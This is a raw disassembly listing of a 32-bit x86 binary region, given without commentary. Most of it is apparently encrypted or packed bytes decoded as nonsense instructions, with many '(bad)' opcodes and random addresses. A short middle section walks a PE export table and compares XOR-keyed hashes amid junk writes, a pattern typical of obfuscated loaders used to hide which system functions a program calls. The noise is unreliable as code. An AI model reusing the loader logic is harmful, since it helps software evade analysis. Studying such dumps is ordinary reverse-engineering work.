  404756:	mov    bl,0xaa
  404758:	push   esi
  404759:	lea    ebx,[edi]
  40475b:	retf   0xc41
  40475e:	mov    WORD PTR [edx-0x24],gs
  404761:	fst    DWORD PTR [ebx-0x79]
  404764:	xor    BYTE PTR [ecx-0x2525be5a],dl
  40476a:	sub    bl,BYTE PTR [ecx]
  40476c:	jbe    0x404790
  40476e:	mov    bl,0x61
  404770:	fs leave 
  404772:	int3   
  404773:	jae    0x4047d7
  404775:	adc    ecx,esi
  404777:	inc    eax
  404778:	retf   0x8d98
  40477b:	inc    eax
  40477c:	in     eax,dx
  40477d:	adc    DWORD PTR [ecx],edx
  40477f:	mov    edi,DWORD PTR [eax-0xd]
  404782:	mov    ds:0x7d6d36b5,eax
  404787:	shl    cl,cl
  404789:	dec    eax
  40478a:	push   0x7f
  40478c:	pop    ebp
  40478d:	jge    0x4047bf
  40478f:	dec    ebp
  404790:	cmc    
  404791:	push   ebx
  404792:	push   es
  404793:	clc    
  404794:	adc    eax,0x383c68eb
  404799:	push   esi
  40479a:	enter  0x9b0b,0xe2
  40479e:	scas   eax,DWORD PTR es:[edi]
  40479f:	(bad)  
  4047a0:	out    0x7e,eax
  4047a2:	xlat   BYTE PTR ds:[ebx]
  4047a3:	mov    bl,ch
  4047a5:	sar    bl,cl
  4047a7:	fimul  WORD PTR [ebx+ebp*8]
  4047aa:	xor    dl,BYTE PTR [ecx]
  4047ac:	ret    0xbdaa
  4047af:	or     ah,BYTE PTR [edx]
  4047b1:	div    BYTE PTR [esi]
  4047b3:	mov    ebp,0x78392173
  4047b8:	inc    ebp
  4047b9:	inc    edx
  4047ba:	fimul  DWORD PTR [eax-0x37615fb1]
  4047c0:	icebp  
  4047c1:	xchg   edx,eax
  4047c2:	loope  0x404771
  4047c4:	cld    
  4047c5:	das    
  4047c6:	sbb    eax,0xaea82627
  4047cb:	aam    0xb
  4047cd:	xchg   ebp,eax
  4047ce:	add    edi,DWORD PTR [esi]
  4047d0:	adc    bl,dl
  4047d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047d3:	retf   
  4047d4:	std    
  4047d5:	data16 (bad) 
  4047d7:	pushf  
  4047d8:	out    dx,eax
  4047d9:	xchg   BYTE PTR [ebp+0x644407b0],dl
  4047df:	fs out dx,al
  4047e1:	mov    ecx,0xaf5e59ff
  4047e6:	inc    edi
  4047e7:	retf   0x8a73
  4047ea:	sbb    DWORD PTR [ebx],esp
  4047ec:	cmp    BYTE PTR ds:0x9fb3e550,bl
  4047f2:	nop
  4047f3:	out    0xc6,al
  4047f5:	cdq    
  4047f6:	xchg   ebx,eax
  4047f7:	mov    al,BYTE PTR cs:[ecx+0x44f3d9a9]
  4047fe:	fdivrp st(1),st
  404800:	mov    dl,0xb7
  404802:	ret    0xcef1
  404805:	inc    edi
  404806:	or     eax,0x399b5aaa
  40480b:	sbb    ebp,edx
  40480d:	jne    0x40484a
  40480f:	pop    esp
  404810:	mov    dh,0x7f
  404812:	jne    0x404885
  404814:	js     0x404859
  404816:	lahf   
  404817:	or     BYTE PTR ds:0xa735df34,0xe3
  40481e:	inc    eax
  40481f:	push   0xffffffe7
  404821:	mov    eax,0x7d8288ff
  404826:	retf   
  404827:	rcl    bh,0x82
  40482a:	xor    BYTE PTR [eax+0x53],bh
  40482d:	adc    DWORD PTR [ebx],eax
  40482f:	mov    esp,0x1cd86a66
  404834:	scas   eax,DWORD PTR es:[edi]
  404835:	(bad)  
  404836:	clc    
  404837:	fs test eax,0x92687fd2
  40483d:	xchg   edx,eax
  40483e:	cld    
  40483f:	xlat   BYTE PTR ds:[ebx]
  404840:	mov    eax,0x3067b13b
  404845:	loope  0x404862
  404847:	xor    BYTE PTR [eax],dl
  404849:	pop    edi
  40484a:	mov    edx,0xda653734
  40484f:	leave  
  404850:	add    al,0x4a
  404852:	scas   eax,DWORD PTR es:[edi]
  404853:	das    
  404854:	cmp    al,0xb5
  404856:	xchg   BYTE PTR [ecx],ah
  404858:	(bad)  
  404859:	push   ebx
  40485a:	inc    ebp
  40485b:	scas   al,BYTE PTR es:[edi]
  40485c:	pop    edi
  40485d:	jle    0x40483e
  40485f:	mov    ah,0xfe
  404861:	cmp    bh,BYTE PTR [esi+0x494100a0]
  404867:	dec    ebp
  404868:	mov    esi,DWORD PTR [ecx-0x4cccbd7c]
  40486e:	pop    es
  40486f:	aas    
  404870:	inc    edx
  404871:	xor    al,0x2a
  404873:	jbe    0x4048f2
  404875:	jns    0x404813
  404877:	mov    WORD PTR [ebp+0x2],es
  40487a:	loope  0x4048cb
  40487c:	shl    ebx,0xce
  40487f:	in     al,dx
  404880:	mov    ds:0x671b33e7,al
  404885:	cs push cs
  404887:	mov    dl,0x4c
  404889:	add    dl,BYTE PTR [esi+0x3a541504]
  40488f:	int3   
  404890:	jb     0x404881
  404892:	dec    ecx
  404893:	mov    ebx,0x3bec1a1b
  404898:	les    ebx,FWORD PTR [esi-0x539a4fe8]
  40489e:	cli    
  40489f:	jmp    0x40488f
  4048a1:	xchg   ebp,eax
  4048a2:	xchg   ebp,eax
  4048a3:	add    al,0xed
  4048a5:	daa    
  4048a6:	jg     0x40482c
  4048a8:	in     eax,0xf2
  4048aa:	pop    edi
  4048ab:	xchg   esi,eax
  4048ac:	inc    esi
  4048ad:	cmp    eax,0xddb3329e
  4048b2:	jb     0x4048c6
  4048b4:	fadd   DWORD PTR [ecx-0x58]
  4048b7:	pop    edi
  4048b8:	(bad)  
  4048b9:	push   DWORD PTR [ebp-0x2f5eb382]
  4048bf:	mov    ebx,0x6682a508
  4048c4:	fnstenv [ebx]
  4048c6:	adc    dh,BYTE PTR [ebx+0x5d]
  4048c9:	data16 add al,0x92
  4048cc:	test   bh,cl
  4048ce:	mov    ds:0x754a4b5b,al
  4048d3:	imul   ecx,eax,0x66
  4048d6:	inc    ebp
  4048d7:	inc    ebp
  4048d8:	sbb    eax,0x5894fa0
  4048dd:	dec    esi
  4048de:	das    
  4048df:	add    dh,BYTE PTR [ebx]
  4048e1:	jne    0x4048fe
  4048e3:	cmp    BYTE PTR [ebx-0x16d59ec8],bl
  4048e9:	stc    
  4048ea:	test   eax,0xec77e50
  4048ef:	arpl   ax,cx
  4048f1:	adc    eax,DWORD PTR [edx+0x30]
  4048f4:	cmp    dl,dl
  4048f6:	sbb    esp,DWORD PTR [ecx]
  4048f8:	int3   
  4048f9:	cmp    edi,edi
  4048fb:	stc    
  4048fc:	std    
  4048fd:	aad    0xbf
  4048ff:	or     bl,dh
  404901:	adc    DWORD PTR [eax+0x277aa36f],0x6d6f1d23
  40490b:	mov    ebx,0x3ea48e63
  404910:	inc    edi
  404911:	adc    al,cl
  404913:	imul   edi,ebx,0x28
  404916:	lahf   
  404917:	adc    esi,DWORD PTR [edi-0x3788ed04]
  40491d:	push   ss
  40491e:	jns    0x404908
  404920:	ret    0xf3ea
  404923:	xchg   edx,eax
  404924:	ins    BYTE PTR es:[edi],dx
  404925:	fcmovbe st,st(5)
  404927:	test   eax,0xf387f2d5
  40492c:	call   0x9f6e7fee
  404931:	iret   
  404932:	pushf  
  404933:	psadbw mm5,QWORD PTR [ebx]
  404936:	les    edx,FWORD PTR [ecx]
  404938:	mov    ah,0xf
  40493a:	lds    esi,FWORD PTR [eax+0x5c]
  40493d:	fcomp  DWORD PTR [esi+0x12]
  404940:	jmp    0x40496b
  404942:	xor    ecx,eax
  404944:	aas    
  404945:	sub    bl,BYTE PTR [ebp-0x22]
  404948:	adc    ax,0x957b
  40494c:	cmp    dh,BYTE PTR [edi]
  40494e:	xchg   ebp,eax
  40494f:	xor    ah,BYTE PTR [edx]
  404951:	aaa    
  404952:	jmp    0x404981
  404954:	mov    ds:0xbab16e18,al
  404959:	call   0x829:0xaa9fb31d
  404960:	pop    ecx
  404961:	aas    
  404962:	adc    eax,0x97131e4
  404967:	out    0xd6,eax
  404969:	or     eax,0x82d4e0fd
  40496e:	gs add al,0x57
  404971:	mov    al,ds:0xc3351f59
  404976:	ror    DWORD PTR [edx-0x7e],1
  404979:	int    0xa7
  40497b:	cmp    dl,BYTE PTR [ecx-0x6a]
  40497e:	sub    edi,DWORD PTR [ebp+ebx*1-0x6b]
  404982:	dec    eax
  404983:	out    0x2f,eax
  404985:	jg     0x40496e
  404987:	movlps xmm2,QWORD PTR [ebp-0x162ac832]
  40498e:	push   ds
  40498f:	xchg   edi,eax
  404990:	loop   0x404949
  404992:	xchg   ecx,eax
  404993:	cmp    ebp,ebp
  404995:	inc    ecx
  404996:	pop    gs
  404998:	ret    0xccdf
  40499b:	mov    WORD PTR [ecx],fs
  40499d:	(bad)  
  40499e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499f:	outs   dx,BYTE PTR ds:[esi]
  4049a0:	add    al,0x0
  4049a2:	jae    0x404955
  4049a4:	cld    
  4049a5:	and    BYTE PTR [edx-0x43],dl
  4049a8:	cwde   
  4049a9:	jecxz  0x4049de
  4049ab:	xchg   ecx,eax
  4049ac:	nop
  4049ad:	add    eax,0x5ced300c
  4049b2:	jl     0x4049e7
  4049b4:	(bad)  
  4049b5:	mov    edx,DWORD PTR [ebp-0x6ef7293d]
  4049bb:	in     al,0x2f
  4049bd:	ja     0x40495c
  4049bf:	fwait
  4049c0:	daa    
  4049c1:	loop   0x404a29
  4049c3:	leave  
  4049c4:	dec    edx
  4049c5:	inc    si
  4049c7:	lods   eax,DWORD PTR ds:[esi]
  4049c8:	sub    al,BYTE PTR [ebp-0x23]
  4049cb:	repnz add eax,0xdbb136ee
  4049d1:	loop   0x404a1e
  4049d3:	fs gs mov eax,0x84626de4
  4049da:	loop   0x40498a
  4049dc:	dec    ebp
  4049dd:	js     0x40497a
  4049df:	adc    al,ch
  4049e1:	sbb    dh,dh
  4049e3:	vorps  xmm7,xmm0,xmm1
  4049e7:	imul   ebx,eax,0xffffffa7
  4049ea:	sbb    BYTE PTR [ecx+0x12577311],0x7c
  4049f1:	or     dl,al
  4049f3:	push   edx
  4049f4:	mov    dl,0x60
  4049f6:	push   cs
  4049f7:	loop   0x4049f4
  4049f9:	sbb    edx,edx
  4049fb:	xchg   BYTE PTR [ebx+0x746048de],ah
  404a01:	scas   al,BYTE PTR es:[edi]
  404a02:	inc    ecx
  404a03:	xchg   ecx,eax
  404a04:	popa   
  404a05:	jle    0x404a70
  404a07:	daa    
  404a08:	call   0x4329:0x7b2cbb29
  404a0f:	mov    BYTE PTR [edi+0x7a9fc2ea],cl
  404a15:	mov    dh,0x73
  404a17:	in     eax,dx
  404a18:	inc    ebp
  404a19:	rol    BYTE PTR [ecx],cl
  404a1b:	pop    esi
  404a1c:	or     DWORD PTR [ebp-0x6595da0e],ecx
  404a22:	add    dl,bh
  404a24:	push   cs
  404a25:	sar    dl,1
  404a27:	xor    BYTE PTR [ebx],bh
  404a29:	add    al,0x9
  404a2b:	loope  0x4049b3
  404a2d:	inc    ebx
  404a2e:	cvtpi2ps xmm5,QWORD PTR [edi]
  404a31:	push   es
  404a32:	test   DWORD PTR [ebp+0x2a2460a8],ecx
  404a38:	pusha  
  404a39:	push   ss
  404a3a:	sti    
  404a3b:	imul   eax,DWORD PTR [eax],0xec164be2
  404a41:	mov    esp,0x1548f336
  404a46:	pushf  
  404a47:	cmc    
  404a48:	ret    
  404a49:	sahf   
  404a4a:	mov    DWORD PTR [ecx],edi
  404a4c:	aaa    
  404a4d:	lods   eax,DWORD PTR ds:[esi]
  404a4e:	pop    ds
  404a4f:	dec    ecx
  404a50:	jecxz  0x404a8a
  404a52:	push   edx
  404a53:	clc    
  404a54:	int    0x2c
  404a56:	lea    edi,[eax]
  404a58:	jp     0x404a75
  404a5a:	fwait
  404a5b:	cwde   
  404a5c:	push   eax
  404a5d:	out    0x3d,al
  404a5f:	add    ah,BYTE PTR [edi-0x3f]
  404a62:	push   edx
  404a63:	jae    0x404aa9
  404a65:	test   DWORD PTR [ebx],ebx
  404a67:	mov    ds:0x53839688,eax
  404a6c:	rcl    DWORD PTR [esi],cl
  404a6e:	adc    eax,0x1b9104ee
  404a73:	add    esp,eax
  404a75:	sbb    BYTE PTR [eax],bl
  404a77:	push   0x7
  404a79:	test   BYTE PTR ds:0xf93c6a70,ch
  404a7f:	sbb    ebx,0x60
  404a82:	pop    ss
  404a83:	push   ds
  404a84:	retf   0x8991
  404a87:	ror    DWORD PTR [ecx+eiz*4],cl
  404a8a:	mov    eax,0x6fe94bcf
  404a8f:	mov    al,ds:0x6028ba57
  404a94:	cli    
  404a95:	outs   dx,DWORD PTR ds:[esi]
  404a96:	in     eax,dx
  404a97:	test   DWORD PTR [edi-0x29],edx
  404a9a:	dec    ecx
  404a9b:	(bad)  
  404a9d:	mov    eax,ds:0xdab55ebe
  404aa2:	xor    eax,0x75507719
  404aa7:	je     0x404a42
  404aa9:	in     eax,0xd6
  404aab:	push   edi
  404aac:	sar    al,0xf9
  404aaf:	push   ebx
  404ab0:	dec    edx
  404ab1:	jmp    0x404b2e
  404ab3:	xor    BYTE PTR [eax-0x15],0x0
  404ab7:	push   eax
  404ab8:	jns    0x404a4a
  404aba:	adc    ecx,ecx
  404abc:	popf   
  404abd:	jb     0x404a54
  404abf:	ds jmp 0x398d1ad9
  404ac5:	dec    edi
  404ac6:	and    ecx,DWORD PTR [eax]
  404ac8:	push   es
  404ac9:	sbb    BYTE PTR [eax+eax*4+0x20],al
  404acd:	leave  
  404ace:	out    0x44,al
  404ad0:	mov    cl,0xe8
  404ad2:	in     al,0xd0
  404ad4:	mov    ch,0xcc
  404ad6:	xchg   esi,eax
  404ad7:	xor    al,0xb8
  404ad9:	call   0xaea7508e
  404ade:	out    0x4f,al
  404ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ae1:	(bad)  
  404ae2:	es nop
  404ae4:	mov    ebx,0x8b492270
  404ae9:	(bad)  
  404aea:	mov    esi,0x2eeca144
  404aef:	(bad)  
  404af1:	cmp    edi,0x7a
  404af4:	nop
  404af5:	jmp    0x404b64
  404af7:	rol    BYTE PTR [ebx-0x6a],1
  404afa:	jge    0x404ad2
  404afc:	call   0xe231:0xbfafac77
  404b03:	mov    dl,0x4e
  404b05:	test   bh,dl
  404b07:	mul    BYTE PTR [ebp-0x22a4169f]
  404b0d:	xchg   ecx,eax
  404b0e:	dec    esp
  404b0f:	jp     0x404b01
  404b11:	xor    al,0x9d
  404b13:	pushf  
  404b14:	out    0x51,eax
  404b16:	jbe    0x404adf
  404b18:	xchg   edx,eax
  404b19:	mov    esp,0x67f5e347
  404b1e:	loop   0x404ab3
  404b20:	repz jae 0x404b6d
  404b23:	fwait
  404b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b25:	or     ch,cl
  404b27:	jnp    0x404aff
  404b29:	xchg   edi,eax
  404b2a:	dec    ebx
  404b2b:	cmp    ah,BYTE PTR [edi-0x7544b55]
  404b31:	adc    ebp,DWORD PTR [eax]
  404b33:	rcl    BYTE PTR [esi-0x3c],0x20
  404b37:	es push esi
  404b39:	push   0x1
  404b3b:	(bad)  
  404b3c:	(bad)  
  404b3d:	mov    cl,0x5c
  404b3f:	mov    dl,0x3a
  404b41:	mov    dl,0xfa
  404b43:	jno    0x404b43
  404b45:	and    ch,BYTE PTR [eax+0x72e9f83d]
  404b4b:	mov    DWORD PTR [ebx],0x7dcb032b
  404b51:	pop    eax
  404b52:	mov    cl,0xbb
  404b54:	push   edx
  404b55:	bound  ecx,QWORD PTR [edi-0x61c2e593]
  404b5b:	(bad)  
  404b5c:	jmp    0x404b1d
  404b5e:	or     cl,BYTE PTR [ebx-0x68]
  404b61:	dec    ebx
  404b62:	cmp    eax,0x847a60cd
  404b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b68:	sub    esp,DWORD PTR [eax]
  404b6a:	cmp    al,0xbf
  404b6c:	sub    BYTE PTR [ebp*8-0x22a5e1ce],0x3c
  404b74:	mov    edx,0x4f5301ce
  404b79:	retf   
  404b7a:	scas   al,BYTE PTR es:[edi]
  404b7b:	add    eax,0xec083946
  404b80:	sbb    BYTE PTR [eax],dl
  404b82:	(bad)  
  404b83:	cmp    DWORD PTR [ecx+ebx*4+0x10],edi
  404b87:	jl     0x404bff
  404b89:	inc    edi
  404b8a:	sub    cl,bl
  404b8c:	push   esp
  404b8d:	and    eax,0xf6b41d6b
  404b93:	mov    al,0x42
  404b95:	test   eax,0xf4bb7578
  404b9a:	push   0xb9472b83
  404b9f:	xor    eax,0x324fb7f4
  404ba4:	pop    es
  404ba5:	mov    ebp,0x20b8eb12
  404baa:	push   eax
  404bab:	add    dl,ch
  404bad:	adc    DWORD PTR [edx-0x551ee552],edi
  404bb3:	mov    dl,0x65
  404bb5:	shl    BYTE PTR [eax-0x75],cl
  404bb8:	(bad)  
  404bb9:	out    dx,al
  404bba:	add    eax,DWORD PTR [edx-0x5eb74392]
  404bc0:	cmp    dl,BYTE PTR [eax+0x4e]
  404bc3:	out    0x84,eax
  404bc5:	or     BYTE PTR [ebp+edi*4+0x1],dl
  404bc9:	inc    esp
  404bca:	mov    ecx,0x623a5915
  404bcf:	ror    BYTE PTR [ebp+edi*1-0x52a45f69],cl
  404bd6:	jb     0x404b5d
  404bd8:	icebp  
  404bd9:	and    BYTE PTR ds:0xfeffd37d,bh
  404bdf:	add    ch,BYTE PTR [esi+eiz*8-0x568d77b2]
  404be6:	lods   eax,DWORD PTR ds:[esi]
  404be7:	dec    edx
  404be8:	add    al,0xb4
  404bea:	and    ebx,esi
  404bec:	lock add edx,DWORD PTR [ebp-0x39]
  404bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bf1:	fidiv  WORD PTR [edx+0x3c7c0ecc]
  404bf7:	push   ebp
  404bf8:	(bad)  
  404bf9:	jg     0x404bdf
  404bfb:	push   es
  404bfc:	push   ds
  404bfd:	sub    eax,0xc0018bc9
  404c02:	addr16 pusha 
  404c04:	push   ebx
  404c05:	retf   
  404c06:	shl    BYTE PTR [eax],cl
  404c08:	enter  0x2bc5,0x14
  404c0c:	ret    0x9519
  404c0f:	mov    eax,ds:0xde198284
  404c14:	imul   eax,DWORD PTR [ebp+0x1dd8a68],0x60
  404c1b:	lahf   
  404c1c:	fisub  DWORD PTR [ebp+0x9]
  404c1f:	sub    cl,BYTE PTR [eax]
  404c21:	aam    0xb9
  404c23:	cmp    DWORD PTR [edi+0x1a650723],ebp
  404c29:	popa   
  404c2a:	or     DWORD PTR [edx+edx*1+0x4f],ebx
  404c2e:	mov    al,ds:0x8af81c20
  404c33:	xchg   edi,eax
  404c34:	and    BYTE PTR ds:[ecx-0x7f],ch
  404c38:	cs or  al,0xce
  404c3b:	call   0xa0ed:0x72f4da42
  404c42:	ins    BYTE PTR es:[edi],dx
  404c43:	push   es
  404c44:	jl     0x404cba
  404c46:	mov    bl,0xe1
  404c48:	jg     0x404bfd
  404c4a:	test   ah,0x8b
  404c4d:	sbb    al,0x99
  404c4f:	lea    edi,[ecx+0x56]
  404c52:	xchg   esi,eax
  404c53:	repz push 0x4c
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	xchg   BYTE PTR [esi],al
  404e98:	in     al,dx
  404e99:	test   al,0xa
  404e9b:	pop    edi
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404e3b
  404ea3:	in     al,0xf2
  404ea5:	jne    0x404e93
  404ea7:	or     BYTE PTR ds:0xf1709d51,0x98
  404eae:	or     ah,BYTE PTR [edx+0x57dc7267]
  404eb4:	jmp    0x6661999
  404eb9:	dec    ecx
  404eba:	dec    eax
  404ebb:	inc    ebp
  404ebc:	mov    cl,0x45
  404ebe:	mov    esi,0xb75fd628
  404ec3:	retf   0x9ab3
  404ec6:	idiv   DWORD PTR [ecx-0x33be4fdb]
  404ecc:	sahf   
  404ecd:	mov    ds:0x2a32bd91,eax
  404ed2:	dec    ecx
  404ed3:	xchg   edx,eax
  404ed4:	and    eax,0x68ce207
  404ed9:	dec    edi
  404eda:	repnz mov es:0x3b187038,al
  404ee1:	stos   DWORD PTR es:[edi],eax
  404ee2:	icebp  
  404ee3:	adc    esp,DWORD PTR [ebx]
  404ee5:	hlt    
  404ee6:	cdq    
  404ee7:	femms  
  404ee9:	add    eax,DWORD PTR [edi+ebx*8+0x4b700931]
  404ef0:	xchg   ecx,eax
  404ef1:	pop    edx
  404ef2:	xchg   edx,eax
  404ef3:	into   
  404ef4:	adc    DWORD PTR [ebx+0x17cd956a],edi
  404efa:	(bad)  
  404efb:	pop    ebp
  404efc:	mov    bl,0x1e
  404efe:	xchg   ecx,eax
  404eff:	mov    ah,0x39
  404f01:	stos   DWORD PTR es:[edi],eax
  404f02:	mov    esi,0xe650c389
  404f07:	loopne 0x404f06
  404f09:	xchg   edx,eax
  404f0a:	mov    ds,WORD PTR [edi+0x6e26b78e]
  404f10:	mov    bl,0x4d
  404f12:	jno    0x404f46
  404f14:	jb     0x404e9c
  404f16:	(bad)  
  404f17:	and    DWORD PTR [edx-0x45],eax
  404f1a:	neg    BYTE PTR [ebp+0x4]
  404f1d:	sub    bl,ch
  404f1f:	jecxz  0x404f7d
  404f21:	inc    eax
  404f22:	inc    edi
  404f23:	call   0x99e7a268
  404f28:	pushf  
  404f29:	or     bl,BYTE PTR [ecx]
  404f2b:	push   ebp
  404f2c:	fsubr  st(4),st
  404f2e:	pop    edx
  404f2f:	push   esi
  404f30:	jecxz  0x404f0e
  404f32:	jb     0x404ef0
  404f34:	ret    
  404f35:	aam    0xd7
  404f37:	mov    gs,WORD PTR [esi-0x2357fe65]
  404f3d:	es ja  0x404f32
  404f40:	imul   edx,DWORD PTR [ebx],0x71
  404f43:	push   ebp
  404f44:	push   esi
  404f45:	mov    ds:0xa34e8fba,al
  404f4a:	adc    dh,dl
  404f4c:	mov    dl,0x23
  404f4e:	mov    ecx,0x283f7b98
  404f53:	mov    ds:0xfa772318,eax
  404f58:	popa   
  404f59:	fcomp  DWORD PTR [ecx]
  404f5b:	pop    edi
  404f5c:	fimul  WORD PTR [ecx+0x27]
  404f5f:	rol    BYTE PTR [ebp+0xb],1
  404f62:	jo     0x404f9d
  404f64:	pusha  
  404f65:	fldenv [eax-0x1588eb6f]
  404f6b:	std    
  404f6c:	nop
  404f6d:	repnz xchg edx,eax
  404f6f:	and    al,bl
  404f71:	push   0xa8c37d06
  404f76:	and    eax,0x52de699e
  404f7b:	push   edx
  404f7c:	ret    
  404f7d:	push   ebp
  404f7e:	(bad)  
  404f7f:	dec    ecx
  404f80:	pop    esp
  404f81:	(bad)  
  404f82:	jp     0x404ff4
  404f84:	not    BYTE PTR [edx-0x24580c7b]
  404f8a:	popa   
  404f8b:	sbb    eax,0x745615c
  404f90:	call   0xcc03f671
  404f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f96:	aam    0x87
  404f98:	sub    cl,cl
